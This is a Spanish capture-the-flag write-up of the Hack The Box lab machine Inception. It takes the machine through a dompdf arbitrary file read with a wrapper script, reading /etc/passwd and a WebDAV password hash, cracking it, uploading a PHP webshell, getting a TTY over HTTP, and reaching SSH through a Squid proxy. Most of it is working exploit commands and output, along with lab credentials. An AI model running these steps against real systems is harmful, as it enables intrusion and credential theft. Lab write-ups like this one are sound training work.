---
layout: post
title:  "Maquina Retirada Inception de Hack The Box (Necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada INCEPTION
tags: HTB, dompdf, Remote File Read, squidproxy, webdav, CronTabs, Web Hacking, Maquinas Retiradas, Writeup
---

# Inception ~ Hack The Box

Realizamos el Primer escaneo con Nmap
```bash
# nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.10.10.67
```
Realizamos el segundo escaneo para averiguar la version y servicios en los puerto abiertos
```bash
# nmap -sC -sV -p80,3128 -Pn -n -v 10.10.10.67

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Inception
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
```

Procedemos a enumerar el servicio `http` con la herramienta `whatweb`
```bash
# whatweb http://10.10.10.67                                                                                                                                                     
http://10.10.10.67 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.67], Script, Title[Inception]
```
Procedemos a hechar un ojo a la pagina web y al codigo fuente de la misma.
```bash
curl -s -X GET "http://10.10.10.67/"
<!-- Todo: test dompdf on php 7.x -->
```
Encontramos al final de codigo fuente algo sobre `DOMPDF`
Investigamos a nivel google que es DOMPDF:   `DOMPDF es un conversor de HTML a PDF escrito en PHP`
Buscamos Exploits Github para DOMPDF:   Encontramos este exploit de Arbitrary File Read en github-- `https://github.com/defarbs/dompdf-exploit`
```bash
curl -s -X GET "10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd"
```

Tratamos el `Output del comando anterior para verlo todo guay y decodificarlo`
```bash
# curl -s -X GET "10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd" | grep -E '[.*?]' | grep -v  '%' | grep -v '/MediaBox' | grep -v '0.000' | awk '{print $8}' | tr -d '[()]' | base64 -d

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
cobb:x:1000:1000::/home/cobb:/bin/bash
```
Identificamos un usuario llamado `cobb` 
Ahora que tenemos la vulnerabilidad de leer archivos de la maquina victima vamos a buscar por recursos interesantes en el sistema.

Enumerando el sistema atraves de un script en bash
```bash
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Dompdf-RemoteFileRead.sh
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #/bin/bash
   2   │ 
   3   │ # Arbitrary File Read Machine Inception HTB HacktheBox
   4   │ 
   5   │ file='$1'
   6   │ 
   7   │ if file != '$0' 2>/dev/null; then
   8   │ 
   9   │     curl -s -X GET "10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=$1" | grep -E '[.*?]' | grep -v  '%' | grep -v  '/MediaBox' | grep -v '0.000' | awk '{print $
       │ 8}' | tr -d '[()]' | base64 -d
  10   │ 
  11   │ fi
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
``` 
Procedemos a enumerar el la ruta `/etc/sites-availble/`
```bash
# ./Dompdf-RemoteFileRead.sh /etc/apache2/sites-available/000-default.conf                                                                                                                                 
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
        Alias /webdav_test_inception /var/www/html/webdav_test_inception
        <Location /webdav_test_inception>
                Options FollowSymLinks
                DAV On
                AuthType Basic
                AuthName "webdav test credential"
                AuthUserFile "/var/www/html/webdav_test_inception/webdav.passwd"
                Require valid-user
        </Location>
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

Encontramos la ruta a  `/webdav_test_inception/webdav.passwd`
Usamos nuestro script para visualizar el archivo en la ruta `/var/www/html/webdav_test_inception/webdav.passwd`
```bash
# ./Dompdf-RemoteFileRead.sh /var/www/html/webdav_test_inception/webdav.passwd                                                                                                   

"webdav_tester": "$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0"
```
Encontramos un hash que vamos a intentar romper con john:
```bash
# john --wordlist=/usr/share/wordlists/rockyou.txt hash
# john --show hash                                                                                                                                                               

"webdav_tester": "babygurl69"

1 password hash cracked, 0 left
```

Como vemos tenemos un webdav podemos intentar usar la herramienta `cadaver` para subir archivos atraves del `webdav`
```bash
cadaver http://10.10.10.67/webdav_test_inception/
Nombre de usuario: webdav_tester
Contraseña: 

dav:/webdav_test_inception/> ls
Listando colección `/webdav_test_inception/': exitoso.
        webdav.passwd                         52  nov  8  2017

dav:/webdav_test_inception/> put webshell.php
Transferiendo webshell.php a '/webdav_test_inception/webshell.php':
 Progreso: [                              ]   0,0% of 36 bytes Progreso: [=============================>] 100,0% of 36 bytes exitoso.
```

Nos subimos el siguiente script en `webshell.php`
```bash
# cat webshell.php                                                                                                                                                              
<?php
        system($_REQUEST['cmd']);
?>
```

Nos autenticamos al webdav por http y procedemos a apuntar al script webshell.php almacenado en el webdav
```bash
http://10.10.10.67/webdav_test_inception/webshell.php?cmd=whoami
www-data
```

Procedemos a intentar ganar acceso a la maquina desde nuestra webshell, pero vemos que por IPTABLES estan todas las conexiones interceptadas para que no se pueda.
Asique hacemos uso del concepto Over-HTTP-TTY de s4vitar para jugar con mkfifo
```bash
https://github.com/s4vitar/ttyoverhttp
```
Nos descargamos el repositorio y realizamos una modificacion fijandonos en que tenemos una Cookie de Seesion
```bash
Authorization: Basic d2ViZGF2X3Rlc3RlcjpiYWJ5Z3VybDY5
```
Modificamos lo siguiente para proporcionar atraves de la cabecera `headers` la `coockie` 
```python
def RunCmd(cmd):
        cmd = cmd.encode('utf-8')
        cmd = b64encode(cmd).decode('utf-8')
        payload = {
                'cmd' : 'echo "%s" | base64 -d | sh' %(cmd)
                }

        headers = {
                'Authorization': 'Basic d2ViZGF2X3Rlc3RlcjpiYWJ5Z3VybDY5'
                }

        result = (requests.get('http://10.10.10.67/webdav_test_inception/webshell.php', params=payload, headers=headers, timeout=5).text).strip()
        return result

def WriteCmd(cmd):
        cmd = cmd.encode('utf-8')
        cmd = b64encode(cmd).decode('utf-8')
        payload = {
                'cmd' : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
        }

        headers = {
                'Authorization': 'Basic d2ViZGF2X3Rlc3RlcjpiYWJ5Z3VybDY5'
        }

        result = (requests.get('http://10.10.10.67/webdav_test_inception/webshell.php', params=payload, headers=headers, timeout=5).text).strip()
        return result
```
Y ya si lo lanzamos obtenemos una FULL TTY desde una webshell, jugando con mkfifo.

# Intrusion atraves de la utilidad FULL-TTY-Over-HTTP

Lanzamos el script:
```bash
# rlwrap python3 tty_over_http.py                                                                                                                                                                            1 ⚙
whoami
www-data
hostname -I
192.168.0.10
> 
```
Enumeramos el sistema en busca de credenciales e usuarios.
```bash
pwd
/var/www/html
ls -l
total 8044
-rw-r--r-- 1 root     root       17128 May  7  2017 LICENSE.txt
-rw-r--r-- 1 root     root        2307 May  7  2017 README.txt
drwxr-xr-x 6 root     root        4096 May  7  2017 assets
drwxrwxr-x 4 root     root        4096 Nov  6  2017 dompdf
drwxr-xr-x 2 root     root        4096 May  7  2017 images
-rw-r--r-- 1 root     root        2877 Nov  6  2017 index.html
-rw-r--r-- 1 root     root     8184961 Oct 31  2017 latest.tar.gz
drwxr-xr-x 2 www-data www-data    4096 Nov  2 12:36 webdav_test_inception
drwxr-xr-x 5 root     root        4096 Nov  6  2017 wordpress_4.8.3
```

Verificando usuarios en el sistema:
```bash
grep "sh" /etc/passwd
> root:x:0:0:root:/root:/bin/bash
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
cobb:x:1000:1000::/home/cobb:/bin/bash
```

Buscamos en el directorio `wordpress_4.8.3` y encontramos un archivo `wp-config.php`
```bash
"root" : "VwPddNh7xMZyDQoByQL4"
```

# Conectandonos a la maquina por SSH gracias al Squid Proxy
Como veiamos antes tenemos el puerto 3128 abierto con un servicio de `Squid Proxy`
Procedemos a configurar el archivo de proxychains4.conf para apuntar a la maquina victima. 
Modificamos los siguiente: 
Comentamos la primera linea que se ve aqui y añadimos la ultima linea al codigo, justo al final del todo en el archivo de configuracion.
```bash
# nano /etc/proxychains4.conf

#socks4         127.0.0.1 9050
http    10.10.10.67 3128
```

Ahora ya podemos usar nmap para verificar que pasamos por el squid proxy con proxychains
```bash
# proxychains nmap -p22 -sT -v -n 127.0.0.1
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-02 20:19 CET
Initiating Connect Scan at 20:19
Scanning 127.0.0.1 [1 port]
[proxychains] Strict chain  ...  10.10.10.67:3128  ...  127.0.0.1:22  ...  OK
Discovered open port 22/tcp on 127.0.0.1
Completed Connect Scan at 20:19, 0.17s elapsed (1 total ports)
Nmap scan report for 127.0.0.1
Host is up (0.17s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Read data files from: /usr/bin/../share/nmap
```

Pudiendo asi pues alcanzar el servicio ssh para conectarnos como el usuario `cobb` con la credencial obtenida anteriormente
```bash
# proxychains ssh cobb@127.0.0.1           
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  10.10.10.67:3128  ...  127.0.0.1:22  ...  OK
cobb@127.0.0.1's password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Thu Nov 30 20:06:16 2017 from 127.0.0.1
cobb@Inception:~$ 
```

Sacamos la flag `user.txt`
```bash
cobb@Inception:~$ cat user.txt 
4a8bc2d686d093f3f8axxxxxxxxxxxxxxx
```

# Escalando Privilegios desde un Contenedor
